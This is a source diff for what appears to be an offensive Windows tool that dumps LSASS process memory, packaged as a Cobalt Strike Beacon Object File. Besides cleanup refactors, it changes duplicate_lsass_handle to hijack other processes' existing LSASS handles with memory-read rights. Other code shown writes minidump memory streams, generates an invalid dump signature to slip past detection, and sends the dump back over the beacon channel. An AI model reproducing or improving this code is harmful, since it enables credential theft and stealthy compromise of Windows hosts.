@@ -55,7 +55,7 @@ BOOL write_file(
     largeInteger.QuadPart = fileLength;
     wchar_t wcFilePath[MAX_PATH];
     wchar_t wcFileName[MAX_PATH];
-    PUNICODE_STRING pUnicodeFilePath = (PUNICODE_STRING)intAlloc(sizeof(UNICODE_STRING));
+    PUNICODE_STRING pUnicodeFilePath = intAlloc(sizeof(UNICODE_STRING));
     if (!pUnicodeFilePath)
     {
 #ifdef BOF
@@ -176,7 +176,7 @@ BOOL download_file(
 
     // 8 bytes for fileId and fileLength
     int messageLength = 8 + fileNameLength;
-    char* packedData = (char*)intAlloc(messageLength);
+    char* packedData = intAlloc(messageLength);
     if (!packedData)
     {
         BeaconPrintf(CALLBACK_ERROR,
@@ -215,7 +215,7 @@ BOOL download_file(
 
     // we use the same memory region for all chucks
     int chunkLength = 4 + CHUNK_SIZE;
-    char* packedChunk = (char*)intAlloc(chunkLength);
+    char* packedChunk = intAlloc(chunkLength);
     if (!packedChunk)
     {
         BeaconPrintf(CALLBACK_ERROR,
@@ -763,7 +763,7 @@ Pmodule_info add_new_module(
     struct LDR_DATA_TABLE_ENTRY* ldr_entry
 )
 {
-    Pmodule_info new_module = (Pmodule_info)intAlloc(sizeof(module_info));
+    Pmodule_info new_module = intAlloc(sizeof(module_info));
     if (!new_module)
     {
 #ifdef BOF
@@ -1147,7 +1147,7 @@ PMiniDumpMemoryDescriptor64 get_memory_ranges(
                 module_list))
             continue;
 
-        PMiniDumpMemoryDescriptor64 new_range = (PMiniDumpMemoryDescriptor64)intAlloc(sizeof(MiniDumpMemoryDescriptor64));
+        PMiniDumpMemoryDescriptor64 new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
         if(!new_range)
         {
 #ifdef BOF
@@ -1224,7 +1224,7 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
     curr_range = memory_ranges;
     while (curr_range)
     {
-        byte* buffer = (byte*)intAlloc(curr_range->DataSize);
+        BYTE* buffer = intAlloc(curr_range->DataSize);
         if (!buffer)
         {
 #ifdef BOF
@@ -1419,12 +1419,12 @@ void generate_invalid_sig(char* signature)
 }
 
 BOOL is_process_handle(
-    HANDLE handle
+    HANDLE hObject
 )
 {
     BOOL is_process = FALSE;
-    ULONG size = 0x1000;
-    POBJECT_TYPE_INFORMATION ObjectInformation = (POBJECT_TYPE_INFORMATION)intAlloc(size);
+    ULONG buffer_size = 0x1000;
+    POBJECT_TYPE_INFORMATION ObjectInformation = intAlloc(buffer_size);
     if (!ObjectInformation)
     {
 #ifdef BOF
@@ -1433,17 +1433,17 @@ BOOL is_process_handle(
         printf(
 #endif
             "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
-            size,
+            buffer_size,
             KERNEL32$GetLastError()
         );
         return FALSE;
     }
 
     NTSTATUS status = NtQueryObject(
-        handle,
+        hObject,
         ObjectTypeInformation,
         ObjectInformation,
-        size,
+        buffer_size,
         NULL
     );
     if (!NT_SUCCESS(status))
@@ -1467,10 +1467,7 @@ BOOL is_process_handle(
 PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
 {
     NTSTATUS status;
-    ULONG initial_size = 0x200000;
-    ULONG buffer_size = initial_size;
-    ULONG actual_buffer_size;
-    ULONG increase_step = 0x10000;
+    ULONG buffer_size = sizeof(SYSTEM_HANDLE_INFORMATION);
     PVOID handleTableInformation = intAlloc(buffer_size);
     if (!handleTableInformation)
     {
@@ -1492,25 +1489,12 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
             SystemHandleInformation,
             handleTableInformation,
             buffer_size,
-            &actual_buffer_size
+            &buffer_size
         );
         if (status == STATUS_INFO_LENGTH_MISMATCH)
         {
-            // increase the size of the buffer to fit all the handles
+            // the buffer was too small, buffer_size now has the new length
             intFree(handleTableInformation); handleTableInformation = NULL;
-            buffer_size += increase_step;
-            if (buffer_size < initial_size)
-            {
-                // an integer overflow is extremely unlikely, but just in case...
-#ifdef BOF
-                BeaconPrintf(CALLBACK_ERROR,
-#else
-                printf(
-#endif
-                    "Cannot increase buffer_size any more\n"
-                );
-                return NULL;
-            }
             handleTableInformation = intAlloc(buffer_size);
             if (!handleTableInformation)
             {
@@ -1561,7 +1545,7 @@ PPROCESS_LIST get_processes_from_handle_table(
     PSYSTEM_HANDLE_INFORMATION handleTableInformation
 )
 {
-    PPROCESS_LIST process_list = (PPROCESS_LIST)intAlloc(sizeof(PROCESS_LIST));
+    PPROCESS_LIST process_list = intAlloc(sizeof(PROCESS_LIST));
     if (!process_list)
     {
 #ifdef BOF
@@ -1600,7 +1584,7 @@ PPROCESS_LIST get_processes_from_handle_table(
 }
 
 HANDLE duplicate_lsass_handle(
-    DWORD dwPid
+    DWORD lsass_pid
 )
 {
     NTSTATUS status;
@@ -1613,34 +1597,53 @@ HANDLE duplicate_lsass_handle(
     if (!process_list)
         return NULL;
 
+    DWORD local_pid = (DWORD)READ_MEMLOC(CID_OFFSET);
+
+    // loop over each ProcessId
     for (ULONG i = 0; i < process_list->Count; i++)
     {
         ULONG ProcessId = process_list->ProcessId[i];
 
-        if (ProcessId == dwPid)
+        if (ProcessId == local_pid)
+            continue;
+        if (ProcessId == lsass_pid)
+            continue;
+        if (ProcessId == 0)
             continue;
         if (ProcessId == 4)
             continue;
 
-        // open a handle to the process with PROCESS_DUP_HANDLE
-        HANDLE hProcess = get_process_handle(
-            ProcessId,
-            PROCESS_DUP_HANDLE,
-            TRUE
-        );
-        if (!hProcess)
-            continue;
+        // we will open a handle to this ProcessId later on
+        HANDLE hProcess = NULL;
 
-        // this isn't super efficient but whatever
+        // loop over each handle of this ProcessId
         for (ULONG j = 0; j < handleTableInformation->Count; j++)
         {
             PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
 
+            // make sure this handle is from the current ProcessId
             if (handleInfo->ProcessId != ProcessId)
                 continue;
 
+            // make sure the handle has PROCESS_QUERY_INFORMATION and PROCESS_VM_READ
+            if ((handleInfo->GrantedAccess & PROCESS_QUERY_INFORMATION) == 0 ||
+                (handleInfo->GrantedAccess & PROCESS_VM_READ) == 0)
+                continue;
+
+            if (!hProcess)
+            {
+                // open a handle to the process with PROCESS_DUP_HANDLE
+                hProcess = get_process_handle(
+                    ProcessId,
+                    PROCESS_DUP_HANDLE,
+                    TRUE
+                );
+                if (!hProcess)
+                    break;
+            }
+
             // duplicate the handle
-            HANDLE hDuped;
+            HANDLE hDuped = NULL;
             status = NtDuplicateObject(
                 hProcess,
                 (HANDLE)(DWORD_PTR)handleInfo->Handle,
@@ -1678,7 +1681,10 @@ HANDLE duplicate_lsass_handle(
             }
             NtClose(hDuped); hDuped = NULL;
         }
-        NtClose(hProcess); hProcess = NULL;
+        if (hProcess)
+        {
+            NtClose(hProcess); hProcess = NULL;
+        }
     }
 
 #ifdef BOF
